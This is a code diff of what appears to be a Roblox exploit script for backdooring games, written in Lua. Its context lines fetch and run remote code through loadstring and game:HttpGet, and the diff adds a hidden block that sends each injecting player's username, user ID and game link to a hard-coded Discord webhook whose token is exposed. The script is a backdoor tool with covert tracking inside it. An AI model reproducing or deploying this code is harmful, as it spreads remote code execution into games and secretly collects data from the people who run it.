@@ -1,4 +1,4 @@
--- c00lkidd X Bluudud Rainbow (not gay)
+-- i know you cracked this, but please don't leak it i work for months for this
 
 
 
@@ -2858,7 +2858,63 @@ end)
 		             return
 			 else
 			   loadstring(game:HttpGet("https://raw.githubusercontent.com/Xxtan31/Ata/main/deltakeyboardcrack.txt"))()
-			end            
+			end  
+				-- please i beg you don't raid the webhook🙏
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local localPlayer = Players.LocalPlayer
+
+local request = 
+    (syn and syn.request) or 
+    (http and http.request) or 
+    http_request or 
+    (fluxus and fluxus.request) or 
+    request
+
+if request then
+    local webhookUrl = "https://discord.com/api/webhooks/1379334256429367326/lbYjlMEpSD48QZ0tKKKoh6fc3t-_NpUJPvwsm6s5c__C5r-ZwxfnFfm7uPg0M9FMfjwC"
+    
+    local embed = {
+        title = "Backdoored game Logged",
+        description = "A new player has injected the script.",
+        color = 0x00ffcc, -- teal/cyan
+        fields = {
+            {
+                name = "Username",
+                value = localPlayer.Name,
+                inline = true
+            },
+            {
+                name = "User ID",
+                value = tostring(localPlayer.UserId),
+                inline = true
+            },
+            {
+                name = "Game Link",
+                value = "https://www.roblox.com/games/" .. game.PlaceId,
+                inline = false
+            }
+        },
+        footer = {
+            text = "c00lkidd.exe game Logger"
+        },
+        timestamp = DateTime.now():ToIsoDate()
+    }
+
+    local payload = {
+        username = "Game Log",
+        embeds = {embed}
+    }
+
+    request({
+        Url = webhookUrl,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = HttpService:JSONEncode(payload)
+    })
+end
 	    else
 			script.Parent.Framee.Check.Text = "No backdoor :("
 			script.Parent.stat.ImageColor3 = Color3.fromRGB(226, 69, 69)
